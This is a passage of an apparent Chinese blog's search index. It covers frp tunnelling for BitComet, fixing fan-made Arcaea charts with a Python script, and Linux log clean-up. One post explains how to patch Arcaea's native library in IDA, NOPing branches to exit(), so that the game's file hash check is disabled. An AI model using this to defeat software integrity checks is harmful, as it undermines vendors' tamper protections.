UDP]\ntype = udp\nlocal_ip = 127.0.0.1\nlocal_port = 22224\nremote_port = 22224\n</code></pre> <p>\u6ce8\u610f\u4ee5\u4e0b\u914d\u7f6e\u9879\uff1a</p> <ul> <li><code>server_addr</code> \u8bbe\u7f6e\u6210\u90a3\u53f0\u6709\u516c\u7f51 IP \u7684\u673a\u5668\u7684 IP \u5730\u5740\uff0c\u53ef\u4ee5\u662f IPv4/IPv6/\u57df\u540d\u3002\u8bbe\u7f6e\u6210 IPv6 \u5730\u5740\u65f6\u4e0d\u9700\u8981\u52a0\u62ec\u53f7 <code>[</code> \u548c <code>]</code> \u3002<code>server_port</code> \u548c <code>frps.ini</code> \u4fdd\u6301\u4e00\u81f4\u3002</li> <li><code>protocol</code> \u4e00\u5f8b\u9009\u62e9 <code>websocket</code>\u3002</li> <li><code>token</code> \u548c <code>tls_enable</code> \u5747\u4e0e <code>frps.ini</code> \u4fdd\u6301\u4e00\u81f4\u3002</li> </ul> <p><code>Remote Download</code> \u6307\u7684\u662f\u6bd4\u7279\u5f57\u661f\u7684\u8fdc\u7a0b\u4e0b\u8f7d\u670d\u52a1\uff0c\u5982\u679c\u4f60\u6bd4\u7279\u5f57\u661f\u9700\u8981\u5f00\u8fd9\u4e2a\u529f\u80fd\uff0c\u4f60\u53ef\u4ee5\u628a\u4ed6\u6253\u5f00\uff0c\u7aef\u53e3\u53f7\u548c\u6bd4\u7279\u5f57\u661f\u4e0a\u7684\u8bbe\u7f6e\u4fdd\u6301\u4e00\u81f4\uff0c\u6bd4\u5982 <code>2333</code>\u3002</p> <p></p> <p><code>BT Listen TCP/UDP</code> \u5c31\u662f peer \u7684\u901a\u4fe1\u7aef\u53e3\uff0c\u5747\u8bbe\u7f6e\u6210 <code>127.0.0.1</code> \u4e0a\u7684 <code>10400</code>\uff0c\u548c\u6bd4\u7279\u5f57\u661f\u4fdd\u6301\u4e00\u81f4\u3002</p> <p></p> <p><code>eMule Listen TCP/UDP</code> \u662f\u6bd4\u7279\u5f57\u661f\u7535\u9a74\u63d2\u4ef6\u7684\u901a\u4fe1\u7aef\u53e3\uff0c\u5747\u8bbe\u7f6e\u6210 <code>127.0.0.1</code> \u4e0a\u7684 <code>22224</code>\uff0c\u548c\u6bd4\u7279\u5f57\u661f\u4e0e\u7535\u9a74\u63d2\u4ef6\u5185\u7684\u8bbe\u7f6e\u4fdd\u6301\u4e00\u81f4\u3002\u5982\u679c\u4f60\u7684\u6bd4\u7279\u5f57\u661f\u7248\u672c\u6ca1\u6709\u7535\u9a74\u63d2\u4ef6\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u5ffd\u7565\u8be5\u9879\u3002</p> <p></p> <p></p>","tags":["frp","bitcomit","proxy"]},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#frp","title":"\u6d4b\u8bd5 frp \u8fde\u63a5","text":"<p>\u73b0\u5728\u5728\u4f60\u7684\u5ba2\u6237\u7aef\u4e0a\u6267\u884c\uff1a</p> <pre><code>frpc.exe -c frpc.ini\n</code></pre> <p>\u5ba2\u6237\u7aef\u4e0a\u5e94\u8be5\u4f1a\u663e\u793a\u65e5\u5fd7\uff1a</p> <pre><code>2022/04/18 15:04:44 [I] [service.go:301] [39744ebb9b0e3aab] login to server success, get run id [39744ebb9b0e3aab], server udp port [7000]\n2022/04/18 15:04:44 [I] [proxy_manager.go:144] [39744ebb9b0e3aab] proxy added: [eMule Listen UDP Remote Download BT Listen TCP BT Listen UDP eMule Listen TCP]\n2022/04/18 15:04:44 [I] [control.go:180] [39744ebb9b0e3aab] [eMule Listen UDP] start proxy success\n2022/04/18 15:04:44 [I] [control.go:180] [39744ebb9b0e3aab] [BT Listen TCP] start proxy success\n2022/04/18 15:04:44 [I] [control.go:180] [39744ebb9b0e3aab] [Remote Download] start proxy success\n2022/04/18 15:04:44 [I] [control.go:180] [39744ebb9b0e3aab] [BT Listen UDP] start proxy success\n2022/04/18 15:04:44 [I] [control.go:180] [39744ebb9b0e3aab] [eMule Listen TCP] start proxy success\n2022/04/18 15:04:45 [I] [proxy.go:481] [39744ebb9b0e3aab] [eMule Listen UDP] incoming a new work connection for udp proxy, ws://XXX.XXX.XXX.XXX:7000/~!frp\n2022/04/18 15:04:45 [I] [proxy.go:481] [39744ebb9b0e3aab] [BT Listen UDP] incoming a new work connection for udp proxy, ws://XXX.XXX.XXX.XXX:7000/~!frp```\n</code></pre> <p>\u540c\u65f6\u670d\u52a1\u7aef\u4e0a\u5e94\u8be5\u4f1a\u7acb\u5373\u663e\u793a\u4e00\u6761\u65e5\u5fd7\uff1a</p> <pre><code>2022/04/13 09:43:21 [I] [service.go:447] [39744ebb9b0e3aab] client login info: ip http://XXX.XXX.XXX.XXX:7000 version [0.38.0] hostname [] os [windows] arch [amd64]\n</code></pre> <p>\u5176\u4e2d\u7684 <code>XXX.XXX.XXX.XXX:7000</code> \u5e94\u8be5\u662f\u4f60\u670d\u52a1\u7aef\u7684 IP + \u7aef\u53e3\uff0c\u800c <code>39744ebb9b0e3aab</code> \u662f\u4f60\u88ab\u670d\u52a1\u7aef\u5206\u914d\u7684\u7528\u6237 ID\uff0c\u6bcf\u6b21\u4f60\u8fde\u63a5\u5230\u670d\u52a1\u7aef\u65f6\uff0c\u90fd\u4f1a\u88ab\u670d\u52a1\u7aef\u968f\u673a\u5206\u914d\u4e00\u4e2a\u7528\u6237 ID\u3002</p> <pre><code>graph TB\n\n  PeerA((peer1)) --&gt; frps_10400;\n  PeerB((peer2)) --&gt; frps_10400;\n\n  subgraph frps.exe\n    frps_10400[0.0.0.0:10400] --&gt; frps_7000;\n  end\n\n  frps_7000[0.0.0.0:7000] --&gt; |websocket| frpc[frpc];\n\n  subgraph frpc and BitComit\n    bitcomit_10400 --&gt; frpc;\n  end\n\n  frpc --&gt; bitcomit_10400[localhost:10400];</code></pre> <p>\u73b0\u5728\uff0c\u6240\u6709 peers \u53d1\u9001\u5230\u90a3\u53f0\u5177\u6709\u516c\u7f51 IP \u7684\u673a\u5668\u7684 <code>allow_ports</code> \u7aef\u53e3\uff08\u5305\u62ec <code>10400</code>\uff09\u7684 TCP \u548c UDP \u6570\u636e\u5305\uff0c\u90fd\u4f1a\u88ab <code>frps.exe</code> \u901a\u8fc7\u53cd\u5411 websocket \u8f6c\u53d1\u56de\u5ba2\u6237\u7aef\u4e0a\u7684 <code>frpc.exe</code>\uff0c\u7136\u540e <code>frpc.exe</code> \u518d\u53d1\u9001\u5230 <code>localhost:10400</code>\uff0c\u7531\u4e8e\u6b64\u65f6\u6bd4\u7279\u5f57\u661f\u6b63\u5728\u76d1\u542c\u672c\u5730\u7684 <code>10400</code> \u7aef\u53e3\uff0c\u56e0\u6b64\u6bd4\u7279\u5f57\u661f\u5c06\u4f1a\u628a\u8fd9\u4e9b <code>frpc.exe</code> \u53d1\u6765\u7684\u6570\u636e\u5305\u8ba4\u4e3a\u662f peers \u53d1\u9001\u8fc7\u6765\u7684\u6570\u636e\u5305\u3002</p>","tags":["frp","bitcomit","proxy"]},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#_4","title":"\u8bbe\u7f6e\u4ee3\u7406","text":"<p>frp \u53ea\u80fd\u89e3\u51b3\u4e00\u4e2a\u65b9\u5411\u4e0a\u7684\u95ee\u9898\uff0c\u5c31\u662f peers \u8fde\u63a5\u5230\u5ba2\u6237\u7aef\uff0c\u800c\u5ba2\u6237\u7aef\u8fde\u63a5\u5230 peers \u7684\u65b9\u5f0f\u5c06\u4f1a\u7531\u4ee3\u7406\u670d\u52a1\u5668\u5b9e\u73b0\u3002</p> <p>\u4f60\u9700\u8981\u5728\u90a3\u53f0\u5177\u6709\u516c\u7f51 IP \u5730\u5740\u7684\u673a\u5668\u4e0a\u642d\u5efa\u4e00\u4e2a\u4ee3\u7406\u670d\u52a1\uff0c\u4ece\u800c\u8ba9\u4f60\u7684\u6bd4\u7279\u5f57\u661f\u80fd\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5\u5230 peers\u3002</p> <p>\u5177\u4f53\u642d\u5efa\u65b9\u6cd5\u8fd9\u91cc\u4e0d\u505a\u4ecb\u7ecd\uff0c\u7f51\u4e0a\u6709\u5f88\u591a\u6559\u7a0b\u3002\u5047\u8bbe\u6211\u4eec\u5df2\u7ecf\u642d\u5efa\u597d\u4e86\u8fd9\u4e2a\u4ee3\u7406\uff0c\u5e76\u4e14\u6620\u5c04\u5728\u4e86 <code>socks5://localhost:1089</code> \u4e0a\u3002</p> <p>\u7136\u540e\u6211\u4eec\u5728\u6bd4\u7279\u5f57\u661f\u8bbe\u7f6e\u91cc\u505a\u597d\u4ee3\u7406\u8bbe\u7f6e\u3002</p> <p></p> <p>\u9664\u4e86 <code>\u4f7f\u7528\u4ee3\u7406\u670d\u52a1\u5668\u8fdb\u884c DNS \u67e5\u8be2</code> \u4ee5\u5916\uff0c\u5176\u4ed6\u90fd\u4e0d\u52fe\u9009\u3002\u8fd9\u76f8\u5f53\u4e8e\u4f7f\u6bd4\u7279\u5f57\u661f\u8fdb\u5165\u5168\u5c40\u4ee3\u7406\u6a21\u5f0f\u3002</p> <p>\u6b64\u65f6\u6211\u4eec\u5df2\u7ecf\u7b49\u4ef7\u4e8e\u5177\u6709\u4e86\u516c\u7f51 IP\uff0c\u5e76\u4e14\u53ef\u4ee5\u4ee5\u516c\u7f51 IP \u8eab\u4efd\u4e0e\u4e92\u8054\u7f51\u8fdb\u884c\u53cc\u5411\u901a\u4fe1\u3002\u4e0d\u51fa\u610f\u5916\u7684\u8bdd\uff0c\u8fd9\u4e2a\u65f6\u5019\u6bd4\u7279\u5f57\u661f\u7684\u706f\u5df2\u7ecf\ud83d\udfe2\u4e86</p> <p></p> <p>\u5982\u679c\u4f60\u7684\u6bd4\u7279\u5f57\u661f\u5ba2\u6237\u7aef\u5185\u6709\u7535\u9a74\u63d2\u4ef6\uff0c\u90a3\u4e48\u4f60\u5e94\u5f53\u540c\u65f6\u4e3a\u7535\u9a74\u63d2\u4ef6\u4e5f\u6253\u5f00\u4ee3\u7406\u3002\u5982\u56fe\uff1a</p> <p></p>","tags":["frp","bitcomit","proxy"]},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#_5","title":"\u662f\u5426\u8981\u5173\u95ed\u53cd\u5438\u8840","text":"<p>\u5728\u5148\u524d\u7684\u7248\u672c\u4e2d\uff0c\u6211\u5199\u9053\uff1a</p> <p>\u56e0\u4e3a\u6bd4\u7279\u5f57\u661f\u63a5\u6536\u5230\u7684\u6570\u636e\u5305\u90fd\u662f <code>frpc.exe</code> \u53d1\u6765\u7684\uff0c\u56e0\u6b64\u6240\u6709\u7684 peers \u7684\u5916\u7f51 IP \u90fd\u662f <code>127.0.0.1</code>\uff0c\u5927\u91cf\u76f8\u540c IP \u53ef\u80fd\u4f1a\u89e6\u53d1\u6bd4\u7279\u5f57\u661f\u7684\u53cd\u5438\u8840\u673a\u5236\uff0c\u56e0\u6b64\u628a\u4ed6\u5173\u6389\u3002</p> <p>\u4f46\u5b9e\u9645\u4e0a\u7ecf\u8fc7\u6211\u7684\u6d4b\u8bd5\uff0c\u5c06\u53cd\u5438\u8840\u9009\u9879\u8bbe\u7f6e\u4e3a <code>\u81ea\u52a8</code> \u65f6\uff0c\u5e76\u4e0d\u4f1a ban \u6389\u6240\u6709\u6765\u81ea <code>127.0.0.1</code> \u7684 IP\uff0c\u5e76\u4e14\u6bd4\u7279\u5f57\u661f\u540c\u65f6\u4f9d\u7136 ban \u6389\u4e86\u5f88\u591a\u771f\u6b63\u5728\u5438\u8840\u7684 peers\uff0c\u5176\u4e2d\u4e0d\u4e4f\u6765\u81ea <code>127.0.0.1</code> \u7684 IP \u5730\u5740\u3002</p> <p>\u663e\u7136\uff0c\u5c06\u53cd\u5438\u8840\u8bbe\u7f6e\u4e3a <code>\u81ea\u52a8</code> \u65f6\uff0c\u6bd4\u7279\u5f57\u661f\u7684\u53cd\u5438\u8840\u673a\u5236\u5e76\u4e0d\u662f\u5b8c\u5168\u9760 IP \u5730\u5740\u6765\u5224\u65ad\u7684\uff08\u53ef\u80fd\u662f\u901a\u8fc7\u7528\u6237 ID \u5224\u65ad\u7684\uff09\uff0c\u56e0\u6b64\u81ea\u7136\u4e5f\u4e0d\u4f1a\u5f71\u54cd\u6211\u4eec\u4f7f\u7528\u5185\u7f51\u7a7f\u900f\u3002</p> <p>\u6211\u7684\u5efa\u8bae\u662f\u5c06\u53cd\u5438\u8840\u8bbe\u7f6e\u4e3a <code>\u81ea\u52a8</code> \u5373\u53ef\u3002</p>","tags":["frp","bitcomit","proxy"]},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#_6","title":"\u6d4b\u8bd5\u6548\u679c","text":"<p>\u73b0\u5728\u53bb\u4e0b\u8f7d\u4efb\u610f\u4e00\u4e2a BT \u79cd\u5b50\uff0c\u5982\u679c\u70b9\u5f00 <code>\u7528\u6237</code> \u9009\u9879\u5361\uff0c\u53d1\u73b0\u5f88\u591a\u6765\u81ea <code>127.0.0.1</code> \u7684\u8fde\u63a5\uff0c\u5e76\u4e14\u6765\u6e90\u662f <code>\u88ab\u52a8</code>\uff0c\u53d1\u8d77\u662f <code>\u8fdc\u7a0b</code>\uff0c\u6b64\u65f6\u5c31\u8bf4\u660e\u4f60\u5df2\u7ecf\u8bbe\u7f6e\u6b63\u786e\u4e86\u3002</p> <p></p>","tags":["frp","bitcomit","proxy"]},{"location":"blog/2022/220414-fk-arcaea-songlist-hash/","title":"\u89e3\u9664 Arcaea \u5bf9 songlist \u7b49\u6587\u4ef6\u7684\u54c8\u5e0c\u6821\u9a8c","text":"<p>\u73a9\u81ea\u5236\u7684\u5165\u95e8\u64cd\u4f5c\uff0c\u8bdd\u4e0d\u591a\u8bf4\uff0c\u76f4\u63a5\u5f00\u5e72\u3002</p> <ul> <li>\u6240\u7528 IDA \u7248\u672c\uff1a<code>IDA x64 Pro v7.0</code></li> <li>\u6240\u7528\u4e8c\u8fdb\u5236\u6587\u4ef6\uff1a<code>libcocos2dcpp.so</code></li> <li>\u4e8c\u8fdb\u5236\u6587\u4ef6\u7248\u672c\uff1a<code>3.12.6</code></li> </ul> <p>\u63d0\u793a</p> <p>iOS \u90a3\u8fb9\u7684 <code>Arc-mobile</code> \u4e5f\u53ef\u4ee5\u7528\u540c\u6837\u601d\u8def\u8fdb\u884c\u4fee\u6539\u3002</p>","tags":["ida","arcaea"]},{"location":"blog/2022/220414-fk-arcaea-songlist-hash/#_1","title":"\u5b9a\u4f4d","text":"<p>\u9996\u5148\u5b57\u7b26\u4e32\u641c\u7d22 <code>songlist</code>\uff0c\u627e\u5230 <code>songs/songlist</code>\uff0c\u53cc\u51fb\u3002</p> <p></p> <p>\u53f3\u952e <code>Xrefs graph to</code>\uff0c\u770b\u770b\u8fd9\u4e2a\u53d8\u91cf\u88ab\u5f15\u7528\u7684\u4f4d\u7f6e\u3002</p> <p></p> <p>\u8fd9\u51e0\u4e2a\u51fd\u6570\u91cc\uff0c\u603b\u6709\u4e00\u4e2a\u662f\u5bf9 songlist \u505a\u54c8\u5e0c\u6821\u9a8c\u7684\uff0c\u90a3\u5c31\u4e00\u4e2a\u4e00\u4e2a\u6765\u770b\u5457\u3002\u8ba9\u6211\u4eec\u8282\u7ea6\u4e00\u70b9\u65f6\u95f4\uff0c\u5047\u8bbe\u5927\u5bb6\u8fd0\u6c14\u90fd\u5f88\u597d\uff0c\u4e00\u4e0a\u6765\u90fd\u6253\u7b97\u6765\u731c <code>sub_9450EC</code> \u8fd9\u4e2a\u51fd\u6570\u3002</p> <p> </p> <p>\u53ef\u89c1\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e0d\u4ec5\u4ec5\u7528\u4e86 <code>songs/songlist</code>\uff0c\u8fd8\u7528\u5230\u4e86 <code>songs/packlist</code> \u548c <code>songs/unlocks</code> \u7b49\u8def\u5f84\u3002\u90a3\u770b\u6765\u5c31\u662f\u8fd9\u4e2a\u51fd\u6570\u4e86\uff01</p> <p>\u55ef\uff0cF5\u3002</p> <p>\u89c2\u5bdf\u8fd9\u4e00\u957f\u4e32 if \u8bed\u53e5\u5757\uff1a</p> <p></p> <p>\u6700\u540e\u8fd9\u91cc\u662f\u76f4\u63a5\u8c03\u7528 <code>exit()</code> \u51fd\u6570\u3002\u90a3\u770b\u6765\u5c31\u662f\u8fd9\u4e86\u3002</p> <p>\u56de\u5230 <code>IDA View</code>\uff0c\u770b\u770b <code>exit()</code> \u51fd\u6570\u5728\u54ea\u3002</p> <p></p> <p>\u627e\u5230\u8c03\u7528 <code>exit()</code> \u51fd\u6570\u7684\u6807\u7b7e <code>loc_9459F0</code>\uff0c\u5411\u4e0a\u9ad8\u4eae\u6240\u6709\u8df3\u8f6c\u5230\u8fd9\u4e2a\u6807\u7b7e\u7684\u6307\u4ee4\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u90fd\u662f\u4e00\u4e9b <code>CBNZ</code> \u548c <code>B.NE</code> \u6307\u4ee4\uff0c\u90a3\u5c31\u5f88\u597d\u529e\u4e86\uff0c\u5168\u90e8\u6539\u6210 <code>NOP</code> \u5c31\u884c\u3002</p>","tags":["ida","arcaea"]},{"location":"blog/2022/220414-fk-arcaea-songlist-hash/#_2","title":"\u4fee\u6539","text":"<p>\u76f4\u63a5\u4e0a Keypatch\u3002</p> <p></p> <p>\u603b\u51716\u5904\uff0c\u5168\u90e8\u6539\u6210 <code>NOP</code>\uff0c\u6539\u5b8c\u518d F5 \u4e00\u6b21\uff0c\u641c\u4e00\u4e0b <code>exit</code>\u3002</p> <p></p> <p>\u770b\u6765\u5df2\u7ecf\u4e0d\u4f1a\u89e6\u53d1\u8fd9\u4e2a <code>exit</code> \u4e86\uff0c\u6536\u5de5\u3002</p>","tags":["ida","arcaea"]},{"location":"blog/2022/220416-arcaea-fanmade-chart-problem/","title":"Arcaea \u81ea\u5236\u8c31\u79fb\u690d\u5e38\u89c1\u95ee\u9898","text":"<p>\u4e00\u3001Arcade \u751f\u6210\u7684\u81ea\u5236\u8c31\uff08\u4ee5\u53ca Arcaoid \u8c31\uff09\u6ca1\u6709\u786e\u5b9a <code>base_bpm</code>\uff0c\u4f46\u662f <code>songlist</code> \u4e2d\u8fd9\u4e2a\u503c\u6bd4\u8f83\u91cd\u8981\uff0c\u8fd9\u4f53\u73b0\u5728\uff1a</p> <ul> <li><code>bpm</code> \u5b57\u6bb5\u4e0d\u5f71\u54cd\u8c31\u9762\u57fa\u51c6\u6d41\u901f\uff0c\u53ea\u5f71\u54cd\u9009\u66f2\u754c\u9762\u7684\u663e\u793a\u6548\u679c\uff0c\u56e0\u6b64\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u4efb\u610f\u503c\uff0c\u6216\u8005\u5199\u4e00\u4e9b\u5947\u5947\u602a\u602a\u7684\u4e1c\u897f\uff08\u6bd4\u5982\u5b9a\u6570\uff09</li> <li><code>bpm_base</code> \u7684\u503c\u4e0e <code>timing</code> \u8bed\u53e5\u4e2d\u58f0\u660e\u7684 bpm \u7684\u6bd4\u503c\u51b3\u5b9a\u8be5\u6bb5 timing \u5185\u7684\u5b9e\u9645\u6d41\u901f\u500d\u7387\uff08\uff1f\uff09<ul> <li>\u8fd9\u4e2a\u6bd4\u503c\u8d8a\u5c0f\uff0c\u6d41\u901f\u8d8a\u5feb</li> <li>\u4e00\u822c\u60c5\u51b5\u4e0b\u5efa\u8bae\u628a <code>bpm_base</code> \u76f4\u63a5\u8bbe\u7f6e\u4e3a <code>t=0</code> \u7684 <code>timing</code> \u8bed\u53e5\u4e2d\u89c4\u5b9a\u7684 bpm\uff0c\u56e0\u4e3a\u7edd\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u503c\u90fd\u662f\u8fd9\u9996\u6b4c\u7684 bpm \u503c</li> <li>\u4f46\u5f53\u9047\u5230\u67d0\u4e9b\u8c31\u9762\u5f00\u5934\u6d41\u901f\u5f02\u5e38\uff08\u4f8b\u5982\u767d\u9b54\u738b\uff09\u65f6\uff0c\u5efa\u8bae\u628a <code>base_bpm</code> \u8bbe\u7f6e\u6210\u5176\u4ed6 <code>timing</code> \u8bed\u53e5\u4e2d\u89c4\u5b9a\u7684 bpm \u503c</li> </ul> </li> </ul> <p>\u6211\u4eec\u4ee5\u767d\u9b54\u738b\u4e3a\u4f8b\uff1a</p> pragmatism_2.aff<pre><code>timing(0,87.00,2.00);\ntiming(11034,174.00,4.00);\ntiming(33103,348.00,1.00);\ntiming(34482,174.00,4.00);\ntiming(57930,87.00,2.00);\ntiming(68964,130.50,3.00);\ntiming(78620,174.00,4.00);\ntiming(103447,0.00,4.00);\ntiming(104826,87.00,4.00);\n...\n</code></pre> <p>\u6ce8\u610f\uff0c\u767d\u9b54\u738b\u7684 <code>base_bpm</code> \u5728 <code>songlist</code> \u91cc\u8bbe\u7f6e\u4e3a <code>174</code>\u3002</p> <p>\u56e0\u6b64\uff0c<code>0~11034</code> \u5185\u8c31\u9762\u901f\u5ea6\u4f1a\u964d\u5230\u539f\u6765\u7684\u4e00\u534a\uff0c\u800c <code>103447~104826</code> \u5185\u8c31\u9762\u901f\u5ea6\u53d8\u6210 <code>0</code>\uff08\u9aa4\u505c\u6548\u679c\uff09\u3002</p> <p>\u4e8c\u3001\u867d\u7136\u5b98\u65b9\u66f2\u5b50\u7684 <code>base.jpg</code> \u662f 512x512\uff0c<code>base_256.jpg</code> \u662f 256x256\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u8fd9\u4e2a\u5c3a\u5bf8\u662f\u53ef\u4ee5\u968f\u4fbf\u8bbe\u8ba1\u7684\uff0c\u751a\u81f3\u4e0d\u662f\u6b63\u65b9\u5f62\u90fd\u884c\u3002</p> <p>\u4e09\u3001\u67d0\u4e9b\u81ea\u5236\u8c31\u4e2d <code>aff</code> \u6587\u4ef6\u7684\u8bed\u53e5\u4e0d\u7b26\u5408 Arcaea \u89c4\u8303\u3002\u8fd9\u4e9b\u8c31\u9762\u5728 Arcade \u4e2d\u80fd\u6b63\u5e38\u64ad\u653e\uff0c\u4f46\u662f\u5728 Arcaea \u4e2d\u9009\u66f2\u5b8c\u6210\u540e\u4f1a\u7acb\u5373\u95ea\u9000\u3002\u4ee5\u4e0b\u662f\u6211\u627e\u5230\u7684\u4e00\u4e9b\u95ee\u9898\uff1a</p> <ul> <li><code>timing</code> \u8bed\u53e5\u4e2d\uff0c<code>beats</code> \u53c2\u6570\u4e0d\u80fd\u4e3a <code>0.00</code>\uff0c\u5f88\u591a\u81ea\u5236\u8c31\u4e3a\u4e86\u4e0d\u51fa\u73b0\u8282\u62cd\u7ebf\u4f1a\u8bbe\u7f6e\u6210 <code>0.00</code></li> <li>\u5982\u679c <code>timing</code> \u8bed\u53e5\u51fa\u73b0\u5728 <code>timinggroup</code> \u8bed\u53e5\u5757\u4e2d\uff0c\u90a3\u4e48 <code>beats</code> \u53c2\u6570\u548c <code>bpm</code> \u53c2\u6570\u5747\u53ef\u4e3a <code>0.00</code>\uff0c\u4e0d\u53d7\u4e0a\u4e00\u6761\u7684\u7ea6\u675f</li> <li>\u6bcf\u4e2a\u8c31\u9762\u6709\u4e14\u4ec5\u6709\u4e00\u4e2a <code>t=0</code>\u7684 <code>timing</code> \u8bed\u53e5\uff0c\u4e14\u5176 <code>bpm</code> \u53c2\u6570\u4e0d\u53ef\u4e3a\u8d1f\u6570</li> <li><code>timing</code> \u8bed\u53e5\u4e2d\uff0c<code>bpm</code> \u53c2\u6570\u5fc5\u987b\u4fdd\u7559\u4e24\u4f4d\u5c0f\u6570</li> <li><code>camera</code> \u8bed\u53e5\u7684\u7b2c 2-7 \u4e2a\u53c2\u6570\uff08\u5373 <code>transverse</code>, <code>bottomzoom</code>, <code>linezoom</code>, <code>steadyangle</code>, <code>topzoom</code>, <code>angle</code>\uff09\u5fc5\u987b\u4fdd\u7559\u4e24\u4f4d\u5c0f\u6570</li> <li><code>arc</code> \u8bed\u53e5\u4e2d <code>color</code> \u53c2\u6570\u7684\u503c\u53ea\u80fd\u662f <code>0/1/2/3</code>\uff08\u767d\u9b54\u738b\u662f <code>3</code>\uff09\uff0c\u67d0\u4e9b\u81ea\u5236\u8c31\u4f1a\u5199 <code>-1</code></li> <li><code>arc</code> \u8bed\u53e5\u4e2d <code>t1</code>\u3001<code>t2</code> \u53c2\u6570\u7684\u503c\u5747\u4e3a\u975e\u8d1f\u6574\u6570\uff0c\u67d0\u4e9b\u81ea\u5236\u8c31\u4f1a\u5199\u6210\u8d1f\u6570</li> </ul> <p>\u6211\u5199\u4e86\u4e00\u4e2a\u7b80\u5355\u7684 patch \u51fd\u6570\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff1a</p> <pre><code>def patch_line(line: str) -&gt; str:\n    timing_params = re.match(r'timing\\((.+),(.+),(0\\.00)\\);', line)\n    camera_params = re.match(r'camera\\((.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+)\\);', line)\n    arc_params = re.match(r'arc\\((.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+),(.+)\\)(.+)?;', line)\n    if timing_params:\n        t, bpm, beats = timing_params.groups()\n        # timing \u51fd\u6570\u4e2d\uff0cbeats \u4e0d\u80fd\u4e3a 0.00\uff08\u4e00\u4e9b\u81ea\u5236\u8c31\u5e38\u89c1\u95ee\u9898\uff09\uff0c\u5426\u5219\u5fc5\u7136\u5ba2\u6237\u7aef\u95ea\u9000\uff08\u95ea\u9000\u65f6\u4e0d\u4f1a\u53d1\u51fa\u58f0\u97f3\uff09\n        if beats == '0.00':\n            beats = '4.00'\n        # timing \u51fd\u6570\u4e2d\uff0cbpm \u5fc5\u987b\u4fdd\u7559\u4e24\u4f4d\u5c0f\u6570\uff0c\u5426\u5219\u5fc5\u7136\u5ba2\u6237\u7aef\u95ea\u9000\n        if '.' not in bpm or bpm.split('.')[1] != '00':\n            bpm = f'{float(bpm):.2f}'\n        return f'timing({t},{bpm},{beats});\\n'\n    elif camera_params:\n        t, *params, easing, lastingtime = camera_params.groups()\n        for index, param in enumerate(params):\n            # camera \u51fd\u6570\u7684 2-7 \u4e2a\u53c2\u6570\u5fc5\u987b\u4fdd\u7559\u4e24\u4f4d\u5c0f\u6570\uff08\u4e00\u4e9b\u81ea\u5236\u8c31\u5e38\u89c1\u95ee\u9898\uff09\uff0c\u5426\u5219\u5fc5\u7136\u5ba2\u6237\u7aef\u95ea\u9000\n            if '.' not in param or param.split('.')[1] != '00':\n                params[index] = f'{float(param):.2f}'\n        return f'camera({t},{\",\".join(params)},{easing},{lastingtime});\\n'\n    elif arc_params:\n        t1, *params, color, FX, skylineBoolean, arc_taps = arc_params.groups()\n        print(arc_params.groups())\n        # arc\u7684t1\u3001t2\u5747\u4e3a\u975e\u8d1f\u6574\u6570\uff0c\u67d0\u4e9b\u81ea\u5236\u8c31\u4f1a\u5199\u6210\u8d1f\u6570\uff0c\u8fd9\u5c06\u5bfc\u81f4\u95ea\u9000\n        if t1.startswith('-'):\n            t1 = '0'\n        # arc\u7684\u86c7\u7684\u989c\u8272\u53c2\u6570\uff0c\u53ea\u80fd\u662f0\\1\\2\uff0c\u67d0\u4e9b\u81ea\u5236\u8c31\u4f1a\u5199-1\uff0c\u8fd9\u5c06\u5bfc\u81f4\u95ea\u9000\n        if color == '-1':\n            color = '2'\n        if not arc_taps:\n            arc_taps = ''\n        return f'arc({t1},{\",\".join(params)},{color},{FX},{skylineBoolean}){arc_taps};\\n'\n    else:\n        return line\n\ndef patch_aff(song_dir):\n    for file in os.listdir(song_dir):\n        if file.endswith('.aff'):\n            with open(f'{song_dir}/{file}', 'r', encoding='utf-8') as f:\n                lines = f.readlines()\n            with open(f'{song_dir}/{file}', 'w', encoding='utf-8') as f:\n                f.writelines(map(patch_line, lines))\n</code></pre>","tags":["arcaea"]},{"location":"blog/2022/220417-linux-clean-up-disk-space/","title":"Linux \u6e05\u7406\u78c1\u76d8\u7a7a\u95f4\u5e38\u89c1\u64cd\u4f5c","text":"<p>\u4f7f\u7528\u5982\u4e0b\u65b9\u5f0f\u53ef\u4ee5\u6e05\u7406 Linux \u7684\u7edd\u5927\u90e8\u5206\u5783\u573e\u3002</p>","tags":["linux"]},{"location":"blog/2022/220417-linux-clean-up-disk-space/#journal","title":"\u6e05\u7406 journal \u65e5\u5fd7","text":"<p>\u4e00\u822c\u53ef\u4ee5\u6e05\u7406 2~3 GB\u3002</p> <ul> <li> <p>\u67e5\u770b journal \u65e5\u5fd7\u5360\u7528\u7684\u786c\u76d8\u7a7a\u95f4\uff1a</p> <pre><code>journalctl -x --disk-usage\n</code></pre> </li> <li> <p>\u4e00\u6b21\u6027\u6e05\u7406 journal \u65e5\u5fd7\uff1a</p> <pre><code>journalctl --vacuum-size=10M  # \u6e05\u7406\u65e5\u5fd7\u5230\u53ea\u5269\u4e0b 10M\njournalctl --vacuum-time=1d   # \u6e05\u7406\u4e00\u5929\u524d\u7684\u65e5\u5fd7\n</code></pre> </li> </ul> <p>\u6ce8\u610f</p> 